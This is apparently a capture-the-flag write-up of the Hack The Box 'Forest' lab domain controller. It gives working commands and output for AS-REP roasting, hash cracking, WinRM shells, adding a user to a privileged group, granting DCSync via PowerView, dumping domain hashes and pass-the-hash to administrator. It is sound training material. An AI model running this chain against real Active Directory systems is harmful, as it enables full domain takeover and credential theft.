---
created: 2025-08-18
---

📅 `2025-08-18`

#active-directory #asreproast #bloodhound

----

## 🖥️ Box Info

| ️🏷️ Name         |   `Forest`  |
| --------------- | --- |
| 📆 Release Date |  `2019-10-12`   |
| 🌐 IP Address   | `10.10.10.161`    |
| 🖥️ OS           |  `Windows`   |
| 🎯 Difficulty   |   `Easy`  |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- `ASREProasting`
- `BloodHound`
- Creating users and adding them to groups
- `Account Operators` group membership allows creating and adding users to groups
- Add `DCSync` permissions with `PowerView`

**🛠️ Tools:**  

- `NetExec`
- `BloodHound`
- `PowerView`
- `impacket-secretsdump`

**📚 Learned:**  

- [[ASREProast|Kerberos pre-authentication disabled = ASREProast]]. Always try it, since it's so easy (`nxc ldap <ip> -u '' -p '' --asreproast hash.txt`).
- Create a domain user and add it to a domain group with `net user <user> <password> /add /domain` and `net group "<group>" <user> /domain /add`.
- Inspect the `BloodHound` graph thoroughly, and look up information about groups.
- Read the exploitation steps `BloodHound` shows.
- We can use the `-Credential <cred>` option to run a `PowerView` command as another user. We need to provide it a `PSCredential` object.

----

## 🌐 Port Scan

- **TCP**: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389
- **UDP**: None

---

## 🔍 Enumeration

The open ports suggest we're facing a Domain Controller, and the `nmap` scan revealed that the domain is `htb.local`, and the `DC`'s `FQDN` is `FOREST.htb.local`. I'll add these to `/etc/hosts`. I tried anonymous and guest access over `SMB` and it didn't work. However, I tried anonymous `LDAP` and it worked.

```shell
ldapwhoami -x -H ldap://FOREST.htb.local:389
```

I tried `ASREProasting` and found the ticket for user `svc-alfresco`.

```shell
impacket-GetNPUsers -request -dc-ip 10.10.10.161 'htb.local/'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2025-08-19 15:59:03.992204  2025-08-18 16:58:40.964530  0x410200 

$krb5asrep$23$svc-alfresco@HTB.LOCAL:c646080bbb0f5a32874585e92860b541$b478355e73fb88e35daaecca3c3d473ca7f3637c4e0b5510fb6eecbe85b96e3a0cc16506b4d5dbff0531b39e395d382b3ec7c7b240282cd2d5c29a325203c76ccd7db8dc9fd878bd467aa59305dc18e7f1018c4aa2de2b5a30ca9021c8f525d920e3b3f747125692858ea630fb9ec0bb684c1b53e3ce2971c4bdc05c4e3770fc43a4b31dafd1f4ab991c6d74ed79e72b7a3220f73db9887a76c3129f748167fa88514f0a8656624592bd8579786a4afa8e4187981b0b37bed82806d9416ca9945a524682e37b9b30d9015ca7fc8bd0d9706f3da015c1c52c3162f66bf1d677780a0a389d844d
```

>[!info]
>`ASREProasting` is a technique used to request encrypted authentication tickets for user accounts that have `Kerberos` pre-authentication disabled.


---

## 🪜 Foothold / User

I got the encrypted ticket. Now we can crack it using `hashcat` with mode `18200`.

```shell
.\hashcat.exe -a 0 -m 18200 .\hashes.txt .\rockyou.txt -O -w 4
```

And the password was `s3rvice`. Got credentials.

- `svc-alfresco`:`s3rvice`

These credentials worked with `NetExec`, but there were no interesting shares and no local admin rights for executing commands over `SMB`. However, they also worked over `WinRM`.

```shell
nxc winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
WINRM       10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) 
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

Now let's get a shell.

```shell
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice -s /opt/powershell-modules
```

And user `svc-alfresco` had the user flag.

```shell
*Evil-WinRM* PS C:\Users\svc-alfresco> ls Desktop


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        8/18/2025   1:55 AM             34 user.txt
```

---

## 🛡️ Privilege Escalation

Let's import `PowerView`:

```shell
*Evil-WinRM* PS C:\Users\svc-alfresco> powerview.ps1
```

I tried lots of enumeration techniques and found nothing. There was a user `sebastien` on the machine, but I found no passwords for him and he didn't reuse the service account's password. I decided to use `BloodHound`. I tried using the `.NET` collectors from the `CE` edition but the machine didn't have the required `.NET` version installed, so I used `NetExec`'s collector.

```shell
nxc ldap 10.10.10.161 -u svc-alfresco -p s3rvice --bloodhound --collection All --dns-server 10.10.10.161
```

I copied the `.zip` file to the current directory, started the `BloodHound` containers with `bloodhound-cli containers start` and imported the `.zip` in the web interface. I clicked the predefined search filter "Shortest paths from Owned objects" (after marking `svc-alfresco` as owned) and found this:

![[Pasted image 20250819162339.png]]

User `svc-alfresco` is a member of the group "Account Operators". This group allows its members to create users and add users to groups. We will create another user and add it to the group "Exchange Windows Permissions", whose members, according to the graph, have full control over the domain object. We can use this permission to grant our user `DCSync` privileges.

```shell
# Normal Prueba$1 is too short for password policy
net user asdf Pruebaaa$1 /add /domain

net group "Exchange Windows Permissions" asdf /add /domain
```

And now we can add the rights for `DCSync` to our user (create the credentials first, as user `asdf` is the one in the privileged group).

```shell
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity asdf -Rights DCSync
```

>[!tip]
>The format for `-TargetIdentity` is `"DC=<domain>,DC=<tld>"`, not the domain name itself (the domain name doesn't work).

And now perform `DCSync`.

```shell
$ impacket-secretsdump htb.local/asdf:Pruebaaa$1@10.10.10.161
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

<SNIP>
```

That dumped all the hashes. The administrator hash didn't crack, so I connected via `WinRM` using pass-the-hash.

```shell
evil-winrm -i 10.10.10.161 -u administrator --hash 32693b11e6aa90eb43d32c72a07ceea6
```

```shell
*Evil-WinRM* PS C:\Users\Administrator> whoami
htb\administrator
```

Rooted.